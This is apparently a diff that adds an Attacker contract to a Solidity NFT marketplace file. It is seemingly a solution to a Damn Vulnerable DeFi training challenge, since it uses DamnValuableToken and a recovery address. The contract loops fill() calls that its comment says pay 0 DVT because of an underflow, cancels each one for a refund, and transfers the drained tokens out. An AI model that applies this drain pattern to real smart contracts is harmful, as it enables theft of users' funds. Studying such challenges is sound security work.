@@ -219,3 +219,29 @@ contract ShardsNFTMarketplace is IShardsNFTMarketplace, IERC721Receiver, ERC1155
         return _value.mulDivDown(_rate, 1e6);
     }
 }
+
+contract Attacker {
+    ShardsNFTMarketplace public marketplace;
+    DamnValuableToken public token;
+    address public recovery;
+
+    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
+        marketplace = _marketplace;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        uint64 offerId = 1;
+        uint256 shards = 100;
+
+        for (uint256 i = 0; i < 10001; i++) {
+            // Due to underflow, we are paying 0 DVT to buy shards
+            marketplace.fill(offerId, shards);
+            // then we cancel and get refund of the NFT
+            marketplace.cancel(offerId, i);
+        }
+
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+}
